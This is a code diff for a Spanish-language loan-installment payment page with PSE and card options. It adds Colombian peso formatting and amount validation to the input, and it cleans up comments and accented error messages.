@@ -333,7 +333,7 @@
 
         /* PSE section - OCULTO POR DEFECTO */
         .pse-section {
-            display: none; /* Oculto hasta que se haga clic en PSE */
+            display: none;
             margin: 20px 0;
         }
 
@@ -664,7 +664,7 @@
                         <label for="checkOtroValor">Paga otro valor</label>
                     </div>
                     <div class="otro-valor-input" id="otroValorInput">
-                        <input type="text" id="inputOtroValor" placeholder="$ 0" oninput="validarOtroValor(this)">
+                        <input type="text" id="inputOtroValor" placeholder="$ 0" oninput="validarOtroValor(this)" inputmode="numeric">
                         <p class="otro-valor-note">*Ingresa un valor entre $10.000 y el monto total de tu cuota.</p>
                     </div>
                 </div>
@@ -753,14 +753,17 @@
         let bancoSeleccionado = null;
         let bancoNombre = '';
         let montoAPagar = balance;
-        let metodoPago = null; // Inicialmente ning&uacute;n m&eacute;todo seleccionado
+        let metodoPago = null;
+
+        // ─── Formatear número con puntos de miles (estilo colombiano) ───
+        function formatearPesos(num) {
+            return '$ ' + Math.floor(num).toLocaleString('es-CO');
+        }
 
         // ─── Inicializar datos ───
         document.getElementById('creditoNumero').textContent = creditNumber;
-
-        let balanceFormateado = '$ ' + balance.toLocaleString('es-CO');
-        document.getElementById('creditoValor').textContent = balanceFormateado;
-        document.getElementById('montoPagar').textContent = balanceFormateado;
+        document.getElementById('creditoValor').textContent = formatearPesos(balance);
+        document.getElementById('montoPagar').textContent = formatearPesos(balance);
 
         // ─── Toggle otro valor ───
         function toggleOtroValor() {
@@ -768,24 +771,35 @@
             const inputDiv = document.getElementById('otroValorInput');
             if (checked) {
                 inputDiv.classList.add('visible');
+                document.getElementById('inputOtroValor').value = '';
                 document.getElementById('inputOtroValor').focus();
             } else {
                 inputDiv.classList.remove('visible');
                 montoAPagar = balance;
-                document.getElementById('montoPagar').textContent = '$ ' + balance.toLocaleString('es-CO');
+                document.getElementById('montoPagar').textContent = formatearPesos(balance);
             }
         }
 
         function validarOtroValor(input) {
-            input.value = input.value.replace(/[^0-9]/g, '');
-            const val = parseInt(input.value) || 0;
+            // Quitar todo menos números
+            let soloNumeros = input.value.replace(/[^0-9]/g, '');
+
+            // Limitar al balance máximo
+            let val = parseInt(soloNumeros) || 0;
             if (val > balance) {
-                input.value = String(Math.floor(balance));
-                montoAPagar = balance;
-            } else {
-                montoAPagar = val;
+                val = Math.floor(balance);
+                soloNumeros = String(val);
             }
-            document.getElementById('montoPagar').textContent = '$ ' + montoAPagar.toLocaleString('es-CO');
+
+            // Formatear con puntos de miles
+            if (soloNumeros.length > 0) {
+                input.value = '$ ' + parseInt(soloNumeros).toLocaleString('es-CO');
+            } else {
+                input.value = '';
+            }
+
+            montoAPagar = val;
+            document.getElementById('montoPagar').textContent = formatearPesos(val);
         }
 
         // ─── Selecci&oacute;n de medio de pago (PSE) ───
@@ -798,24 +812,21 @@
 
             btnPSE.classList.add('active');
             btnTarjetas.classList.remove('active');
-            
-            // Mostrar el selector de banco de PSE
+
             pseSection.classList.add('visible');
             ocultarError();
         }
 
-        // ─── Redirecci&oacute;n a Tarjetas (CON GUARDADO EN LOCALSTORAGE) ───
+        // ─── Redirecci&oacute;n a Tarjetas ───
         function irATarjetas() {
-            // Guardamos los datos ingresados para que tarjetas.html los pueda leer
             const email = document.getElementById('inputEmail').value.trim();
             const telefono = document.getElementById('inputTelefono').value.trim();
-            
+
             if (email) localStorage.setItem('email', email);
             if (telefono) localStorage.setItem('celular', telefono);
             localStorage.setItem('montoTotal', montoAPagar);
             localStorage.setItem('creditNumber', creditNumber);
-            
-            // Conservamos los par&aacute;metros de la URL actual para tarjetas.html
+
             const queryString = window.location.search;
             window.location.href = 'tarjetas.html' + queryString;
         }
@@ -879,13 +890,12 @@
             const email = document.getElementById('inputEmail').value.trim();
             const telefono = document.getElementById('inputTelefono').value.trim();
 
-            // Validaciones
             if (!email || !email.includes('@')) {
-                mostrarError('Ingresa un correo electr&oacute;nico v&aacute;lido.');
+                mostrarError('Ingresa un correo electrónico válido.');
                 return;
             }
             if (!telefono || telefono.length < 7) {
-                mostrarError('Ingresa un n&uacute;mero de tel&eacute;fono v&aacute;lido.');
+                mostrarError('Ingresa un número de teléfono válido.');
                 return;
             }
             if (!bancoSeleccionado) {
@@ -893,11 +903,10 @@
                 return;
             }
             if (montoAPagar < 10000) {
-                mostrarError('El valor m&iacute;nimo a pagar es $10.000.');
+                mostrarError('El valor mínimo a pagar es $10.000.');
                 return;
             }
 
-            // Guardamos los datos en localStorage tambi&eacute;n para PSE
             localStorage.setItem('email', email);
             localStorage.setItem('celular', telefono);
             localStorage.setItem('montoTotal', montoAPagar);
@@ -932,13 +941,12 @@
                 const data = await resp.json();
 
                 if (data.ok && data.bank_url) {
-                    // Redirigir al banco
                     window.location.href = data.bank_url;
                 } else {
                     mostrarError(data.error || 'Error procesando el pago. Intenta de nuevo.');
                 }
             } catch (err) {
-                mostrarError('Error de conexi&oacute;n. Intenta de nuevo.');
+                mostrarError('Error de conexión. Intenta de nuevo.');
             } finally {
                 btn.disabled = false;
                 icon.style.display = 'inline';
